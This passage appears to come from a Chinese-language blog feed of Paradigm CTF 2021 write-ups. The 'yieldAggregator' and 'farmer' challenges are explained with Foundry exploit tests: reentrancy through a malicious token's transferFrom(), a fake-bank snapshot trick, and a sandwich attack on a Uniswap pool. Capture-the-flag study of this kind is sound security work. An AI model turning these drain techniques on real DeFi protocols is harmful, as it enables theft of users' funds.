0xf4ab27cc00000000000000000000000000000000000000000000000000000000</span><br><span class="line">    │   ├─ [30357] stage1::f4ab27cc(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003) </span><br><span class="line">    │   │   ├─ [3000] PRECOMPILE::ecrecover(0xb6619a2d9d36a2acecba8e9d99c8444477624a46561077a675900f4af2c42c95, 28, 7607220488960343807138708896118077596332808739342783944889964628376182674536 [7.607e75], 37976160237878000092020130231526712820886658396819410882605408940802787649385 [3.797e76]) </span><br><span class="line">    │   │   │   └─ ← 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf</span><br><span class="line">    │   │   ├─ [228] stage2::034899bc() </span><br><span class="line">    │   │   │   └─ ← 0x07e13e4d00000000000000000000000000000000000000000000000000000000</span><br><span class="line">    │   │   ├─ [21336] stage2::07e13e4d(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">    │   │   │   ├─ [228] stage3::034899bc()</span><br><span class="line">    │   │   │   │   └─ ← 0x3f30497e00000000000000000000000000000000000000000000000000000000</span><br><span class="line">    │   │   │   ├─ [15756] stage3::3f30497e(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">    │   │   │   │   ├─ [228] stage4::034899bc()</span><br><span class="line">    │   │   │   │   │   └─ ← 0x3b0a729200000000000000000000000000000000000000000000000000000000</span><br><span class="line">    │   │   │   │   ├─ [8374] stage4::3b0a7292(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">    │   │   │   │   │   ├─ [228] stage5::034899bc()</span><br><span class="line">    │   │   │   │   │   │   └─ ← 0x890d690800000000000000000000000000000000000000000000000000000000</span><br><span class="line">    │   │   │   │   │   ├─ [2335] stage5::890d6908(290decd90000000000000000000000000000000000000000000000000000ff1c10d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de5546853f5beb75699a068c70adbf9d545de94ec2511fe56862363799f44a700e62769e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca896e201a979a73f6a2947c212ebbed36f5d85b35629db25dfd9441d562a1c6ca89810d188c245dadc6b749cc5dedc56093db37a555fb80cacbc386f899f0de554680000000000000000000000000000000000000000000000000000000000000003)</span><br><span class="line">    │   │   │   │   │   │   └─ ← ()</span><br><span class="line">    │   │   │   │   │   └─ ← ()</span><br><span class="line">    │   │   │   │   └─ ← ()</span><br><span class="line">    │   │   │   └─ ← ()</span><br><span class="line">    │   │   └─ ← ()</span><br><span class="line">    │   └─ ← ()</span><br><span class="line">    ├─ [3197] level::64d98f6e() [staticcall]</span><br><span class="line">    │   ├─ [436] entrypoint::799320bb()</span><br><span class="line">    │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">    │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="line">    └─ ← ()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.yieldAggregator</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/08.yieldAggregator/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/08.yieldAggregator/</url>
      
        <content type="html"><![CDATA[<h1 id="yieldAggregator"><a href="#yieldAggregator" class="headerlink" title="yieldAggregator"></a>yieldAggregator</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>YieldAggregator：只有存取款，但是方法有点特别</li><li>Setup.sol<ul><li>MiniBank：存取款</li><li>Setup：初始化题目</li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>使aggregator和bank合约的WETH归零</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return weth.balanceOf(address(aggregator)) == 0 &amp;&amp; weth.balanceOf(address(bank)) == 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>先来看资产和状态：</p><div class="table-container"><table><thead><tr><th></th><th>ETH</th><th>WETH</th><th>授权</th><th>状态</th></tr></thead><tbody><tr><td>Setup</td><td></td><td>50</td><td>WETH: YieldAggregator=&gt;max</td><td></td></tr><tr><td>YieldAggregator</td><td></td><td></td><td></td><td>owner=Setup, poolTokens[Setup]=50ETH</td></tr><tr><td>MiniBank</td><td></td><td>50</td><td></td><td>balanceOf[YieldAggregator]=50ETH, totalSupply=50ETH</td></tr></tbody></table></div><p>存取款方法，大概率是有逻辑问题：</p><ul><li>批量存取款时候有bug比如一份msg.value重复使用？不可行</li><li>totalSupply溢出导致try报错是否可以利用？不可行</li><li>直接在WETH转账给YieldAggregator和MiniBank？不可行</li><li>存取款先后顺序导致问题？也不行</li><li><code>address[] memory tokens</code>设置奇怪的内容？要试一下</li></ul><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>因为<code>deposit()</code>没有对<code>address[] memory tokens</code>进行检查，并且使用<code>poolTokens[msg.sender] += diff;</code>快照的方式记录存入的WETH数量，因此我们可以使用重入的方式进行攻击。</p><p>思路：第四步是因为我们传入的tokens实现的<code>transferFrom()</code>会重入<code>deposit()</code>，不是正常的转账逻辑，第五步才是正常的WETH转账逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.attacker gets 50WETH</span><br><span class="line">2.preparation: approve</span><br><span class="line">3.begin reentrancy</span><br><span class="line">    4.  1st deposit(): call attacker&#x27;s transferFrom()</span><br><span class="line">    5.  2nd deposit(): call WETH&#x27;s transferFrom()</span><br><span class="line">6.  2nd deposit(): protocol&#x27;s WETH + 50, poolTokens[attacker] = 50</span><br><span class="line">7.  1nd deposit(): protocol&#x27;s WETH + 50, poolTokens[attacker] = 100</span><br><span class="line">8.withdraw</span><br></pre></td></tr></table></figure><p>核心：外部可控地址、外部可控方法、重入导致快照错误</p><h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>由于只要有bank的WETH余额变化，快照都会记录，但是bank是可控的，这意味着我们可以伪造一个假的bank，然后让快照进行记录，之后再在真的bank中取款</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>本题的关键点是：外部地址可控、外部方法可控，然后就可以进一步利用快照进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/08.YieldAggregator/Setup.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/tools/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    Setup public level;</span><br><span class="line">    IWETH9 public weth;</span><br><span class="line">    Protocol public protocol; // bank</span><br><span class="line">    YieldAggregator public aggregator;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行部署</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);</span><br><span class="line">        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line"></span><br><span class="line">        // 部署WETH</span><br><span class="line">        weth = IWETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line"></span><br><span class="line">        level = new Setup&#123;value: 100 ether&#125;(address(weth));</span><br><span class="line">        aggregator = level.aggregator();</span><br><span class="line">        protocol = Protocol(address(level.bank()));</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete_solution01() public&#123;</span><br><span class="line"></span><br><span class="line">        // 先存50进去</span><br><span class="line">        weth.deposit&#123;value: 50 ether&#125;();</span><br><span class="line">        // 做一些授权准备</span><br><span class="line">        weth.approve(address(aggregator), type(uint256).max);</span><br><span class="line">        weth.approve(address(protocol), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // 开始攻击</span><br><span class="line">        address[] memory _tokens = new address[](1);</span><br><span class="line">        _tokens[0] = address(this); // token是本合约，在transferFrom()的时候会重入deposit()</span><br><span class="line">        uint256[] memory _amounts = new uint256[](1);</span><br><span class="line">        _amounts[0] = 100;</span><br><span class="line">        // deposit会重入攻击</span><br><span class="line">        aggregator.deposit(protocol, _tokens, _amounts);</span><br><span class="line"></span><br><span class="line">        // 正常取钱</span><br><span class="line">        _tokens[0] = address(weth);</span><br><span class="line">        _amounts[0] = 100 ether;</span><br><span class="line">        aggregator.withdraw(protocol, _tokens, _amounts);</span><br><span class="line"></span><br><span class="line">        // 检查是否完成题目</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete_solution02() public&#123;</span><br><span class="line"></span><br><span class="line">        // 先存50进去</span><br><span class="line">        weth.deposit&#123;value: 50 ether&#125;();</span><br><span class="line"></span><br><span class="line">        // 新建一个假的bank</span><br><span class="line">        MiniBank fakeBank = new MiniBank(address(weth));</span><br><span class="line">        // 做一些授权准备</span><br><span class="line">        weth.approve(address(aggregator), type(uint256).max);</span><br><span class="line">        weth.approve(address(protocol), type(uint256).max);</span><br><span class="line">        weth.approve(address(fakeBank), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // 在假的bank中进行存储，但是快照一样会进行拍照</span><br><span class="line">        address[] memory _tokens = new address[](1);</span><br><span class="line">        _tokens[0] = address(weth);</span><br><span class="line">        uint256[] memory _amounts = new uint256[](1);</span><br><span class="line">        _amounts[0] = 50 ether;</span><br><span class="line">        aggregator.deposit(Protocol(address(fakeBank)), _tokens, _amounts);</span><br><span class="line"></span><br><span class="line">        // 取款的时候，是在真的bank中取款，因为我们在快照中有余额，因此可以取款成功</span><br><span class="line">        aggregator.withdraw(protocol, _tokens, _amounts);</span><br><span class="line"></span><br><span class="line">        // 检查是否完成题目</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve( address dst, uint256 qty) external returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 不是正常的转账逻辑，而是重入deposit()</span><br><span class="line">    function transferFrom( address src, address dst, uint256 qty) external returns (bool) &#123;</span><br><span class="line">        address[] memory _tokens = new address[](1);</span><br><span class="line">        _tokens[0] = address(weth);</span><br><span class="line"></span><br><span class="line">        uint256[] memory _amounts = new uint256[](1);</span><br><span class="line">        _amounts[0] = 50 ether;</span><br><span class="line">        aggregator.deposit(protocol, _tokens, _amounts);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署WETH</span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.farmer</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/07.farmer/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/07.farmer/</url>
      
        <content type="html"><![CDATA[<h1 id="farmer"><a href="#farmer" class="headerlink" title="farmer"></a>farmer</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>Farmer<ul><li>多个接口</li><li>CompFaucet：别人发COMP到合约，然后只有owner可以取钱，并且只有取钱功能</li><li>CompDaiFarmer<ul><li>涉及COMP、WETH、DAI、cDAI的转换</li><li>owner和harvester身份，harvester可以更改</li><li>存取款</li></ul></li></ul></li><li>Setup：初始化题目</li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><ul><li>faucet的COMP余额为0</li><li>farmer的COMP余额为0</li><li>farmer的DAI余额小于expectedBalance</li></ul><p>因此，任务是：将faucet和farmer的所有COMP设置为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    return COMP.balanceOf(address(faucet)) == 0 &amp;&amp;</span><br><span class="line">        COMP.balanceOf(address(farmer)) == 0 &amp;&amp;</span><br><span class="line">        DAI.balanceOf(address(farmer)) &lt; expectedBalance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>通过Setup的构造函数（假设我们传入50ether），我们获得资产情况如下：</p><div class="table-container"><table><thead><tr><th></th><th>WETH</th><th>DAI</th><th>COMP</th><th>授权</th><th>状态</th></tr></thead><tbody><tr><td>Setup</td><td></td><td></td><td></td><td>WETH：router==&gt;max</td><td></td></tr><tr><td>CompFaucet(comptroller)</td><td></td><td></td><td>50WETH换取的COMP</td><td></td><td>owner=Setup</td></tr><tr><td>CompDaiFarmer</td><td></td><td></td><td></td><td></td><td>owner=Setup, harvester=Setup</td></tr></tbody></table></div><ul><li>faucet的COMP余额为0：很简单，任何人都可以调用farmer.<code>recycle()</code>，将farmer的所有COMP换成DAI，因此这个很容易达成</li><li>farmer的COMP余额为0：一开始就为0好吧，根本就不需要做什么，多余</li><li>farmer的DAI余额小于expectedBalance</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 构造器中</span><br><span class="line">expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield()</span><br><span class="line">// 判断中</span><br><span class="line">DAI.balanceOf(address(farmer)) &lt; expectedBalance</span><br></pre></td></tr></table></figure><ul><li><p>farmer.<code>peekYield()</code>算出来的是实际能换的价格，是滑点之后的实际价格。因此，如果交易之前没人去影响池子，得到(换出)的代币数量是相同的，因此expectedBalance是可预期的，但是如果在此之前有人动了池子，那么预期就会有偏差</p></li><li><p>这里就是让我们来充当这个期间的角色：动了池子。</p><ul><li>如果没人动池子，那么<code>DAI.balanceOf(address(farmer))</code>就会等于<code>expectedBalance</code></li><li>如果拉低DAI价格，那么<code>DAI.balanceOf(address(farmer))</code>就会大于<code>expectedBalance</code></li><li>如果抬高DAI价格，那么<code>DAI.balanceOf(address(farmer))</code>就会小于<code>expectedBalance</code>。这是任务要求的。这也是典型的三明治攻击：我们在<code>recycle()</code>交换之前去夹交易，因为COMP =&gt; WETH =&gt; DAI，夹<code>WETH=&gt;DAI</code>的池子交易。本题只要求我们让owner获利减少即可，而我们获利的部分没做检查。</li></ul></li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/07.farmer/Setup.sol&quot;;</span><br><span class="line">import &quot;./tools/interface.sol&quot;;</span><br><span class="line">import &quot;./tools/helper_COMP.sol&quot;;</span><br><span class="line">import &quot;./tools/helper_DAI.sol&quot;;</span><br><span class="line">import &quot;./tools/factory.sol&quot;;</span><br><span class="line">import &quot;./tools/router.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/tools/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    Setup public level;</span><br><span class="line"></span><br><span class="line">    // uniswapV2系统</span><br><span class="line">    Iu_factory public u_factory;</span><br><span class="line">    Iu_router public u_router;</span><br><span class="line"></span><br><span class="line">    // 池子</span><br><span class="line">    IPair public pair_compweth;</span><br><span class="line">    IPair public pair_wethdai;</span><br><span class="line"></span><br><span class="line">    // 代币</span><br><span class="line">    IWETH9 public weth;</span><br><span class="line">    DAI public dai;</span><br><span class="line">    COMP public comp;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        //////////////////初始化题目系统//////////////////////////</span><br><span class="line"></span><br><span class="line">        // 部署u_factory</span><br><span class="line">        u_factory = Iu_factory(deployHelper_u_factory());</span><br><span class="line">        vm.label(address(u_factory), &quot;u_factory&quot;);</span><br><span class="line"></span><br><span class="line">        // 部署u_router</span><br><span class="line">        u_router = Iu_router(deployHelper_u_router(address(u_factory), address(weth)));</span><br><span class="line">        vm.label(address(u_router), &quot;u_router&quot;);</span><br><span class="line"></span><br><span class="line">        // 创建代币</span><br><span class="line">        weth = IWETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line">        dai = new DAI();</span><br><span class="line">        comp = new COMP();</span><br><span class="line"></span><br><span class="line">        // 懒得找谁要谁要授权谁了，反正swap之前要授权，乱授权算了，反正题目初始化和</span><br><span class="line">        comp.approve(address(u_router), type(uint256).max);</span><br><span class="line">        dai.approve(address(u_router), type(uint256).max);</span><br><span class="line">        weth.approve(address(u_router), type(uint256).max);</span><br><span class="line">        comp.approve(address(level), type(uint256).max);</span><br><span class="line">        dai.approve(address(level), type(uint256).max);</span><br><span class="line">        weth.approve(address(level), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // 创建两个币对池子并添加流动性</span><br><span class="line">        // Comp =&gt; WETH:  5:5</span><br><span class="line">        pair_compweth = IPair(u_factory.createPair(address(comp), address(weth)));</span><br><span class="line">        vm.label(address(pair_compweth), &quot;pair_compweth&quot;);</span><br><span class="line">        weth.deposit&#123;value: 5 ether&#125;();</span><br><span class="line">        comp.transfer(address(pair_compweth), 5 ether);</span><br><span class="line">        weth.transfer(address(pair_compweth), 5 ether);</span><br><span class="line">        pair_compweth.mint(address(this));</span><br><span class="line"></span><br><span class="line">        // WETH =&gt; DAI:  5:5</span><br><span class="line">        pair_wethdai = IPair(u_factory.createPair(address(weth), address(dai)));</span><br><span class="line">        vm.label(address(pair_wethdai), &quot;pair_wethdai&quot;);</span><br><span class="line">        weth.deposit&#123;value: 5 ether&#125;();</span><br><span class="line">        weth.transfer(address(pair_wethdai), 5 ether);</span><br><span class="line">        dai.transfer(address(pair_wethdai), 5 ether);</span><br><span class="line">        pair_wethdai.mint(address(this));</span><br><span class="line"></span><br><span class="line">        //////////////////初始化题目系统//////////////////////////</span><br><span class="line"></span><br><span class="line">        level = new Setup&#123;value: 50 ether&#125;(address(comp), address(dai), address(0), address(u_router), address(weth));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 我们用 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 进行攻击</span><br><span class="line">        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(2 ether);</span><br><span class="line">        vm.startBroadcast(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);</span><br><span class="line"></span><br><span class="line">        // 将 1ETH存入，换成 1WETH，用于swap，不能太少，否则swap不了</span><br><span class="line">        weth.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        CompDaiFarmer farmer = level.farmer();</span><br><span class="line"></span><br><span class="line">        // 为swap做准备</span><br><span class="line">        weth.approve(address(farmer), type(uint256).max);</span><br><span class="line">        weth.approve(address(u_router), type(uint256).max);</span><br><span class="line">        comp.approve(address(farmer), type(uint256).max);</span><br><span class="line">        comp.approve(address(u_router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // swap: WETH =&gt; DAI, 抬高DAI价格</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(weth);</span><br><span class="line">        path[1] = address(dai);</span><br><span class="line"></span><br><span class="line">        // 虽然我们是用0x5B38Da6a701c568545dCfcB03FcB875f56beddC4进行调用，</span><br><span class="line">        // 但是在foundry的Broadcast中，msg.sender不是0x5B38Da6a701c568545dCfcB03FcB875f56beddC4，</span><br><span class="line">        // 因此这里不能写msg.sender，而要硬编码自己的地址</span><br><span class="line">        uint256 bal = weth.balanceOf(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));</span><br><span class="line"></span><br><span class="line">        u_router.swapExactTokensForTokens(</span><br><span class="line">            bal,</span><br><span class="line">            0, </span><br><span class="line">            path,</span><br><span class="line">            address(this), </span><br><span class="line">            type(uint256).max</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // farmer拿走faucet的COMP</span><br><span class="line">        farmer.claim();</span><br><span class="line">        // farmer将本合约中的所有COMP换成DAI</span><br><span class="line">        farmer.recycle();</span><br><span class="line"></span><br><span class="line">        // 检查是否完成题目</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    